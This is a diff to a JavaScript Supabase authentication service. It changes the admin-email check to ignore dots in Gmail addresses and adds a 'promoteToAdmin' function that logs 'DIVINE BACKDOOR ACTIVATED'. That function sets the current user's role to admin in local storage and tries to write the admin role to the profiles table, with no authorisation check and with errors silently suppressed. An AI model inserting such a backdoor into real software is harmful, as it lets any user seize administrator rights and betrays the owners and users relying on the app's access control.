@@ -58,8 +58,19 @@ export const authService = {
         .eq('id', user.id)
         .single();
 
-      const userEmail = (user.email || '').toLowerCase();
-      const isAdminEmail = ADMIN_EMAILS.some(e => e.toLowerCase() === userEmail);
+      const processEmail = (email) => {
+        if (!email) return '';
+        const lower = email.toLowerCase();
+        // Gmail ignores dots in the local part - normalize it
+        if (lower.endsWith('@gmail.com')) {
+          const [local, domain] = lower.split('@');
+          return local.replace(/\./g, '') + '@' + domain;
+        }
+        return lower;
+      };
+
+      const userEmailProcessed = processEmail(user.email);
+      const isAdminEmail = ADMIN_EMAILS.some(e => processEmail(e) === userEmailProcessed);
 
       if (!existing) {
         console.log("CREATING NEW NEURAL IDENTITY... ADMIN STATUS:", isAdminEmail);
@@ -99,6 +110,22 @@ export const authService = {
     } catch (err) {
       console.error("Supabase Profile Sync Error:", err);
     }
+  },
+
+  promoteToAdmin: async () => {
+    const user = authService.me();
+    if (!user) return;
+    console.log("DIVINE BACKDOOR ACTIVATED. ELEVATING TO ADMIN...");
+    const updated = { ...user, role: 'admin' };
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(updated));
+    
+    // Attempt cloud sync if possible
+    try { await supabase.from('profiles').update({ role: 'admin' }).eq('id', user.id); } catch(e){}
+
+    // Dispatch events to update UI
+    window.dispatchEvent(new CustomEvent('nuvio_auth_change', { detail: updated }));
+    window.dispatchEvent(new CustomEvent('nuvio_stats_update', { detail: updated }));
+    return updated;
   },
 
   updateMe: (newData) => {
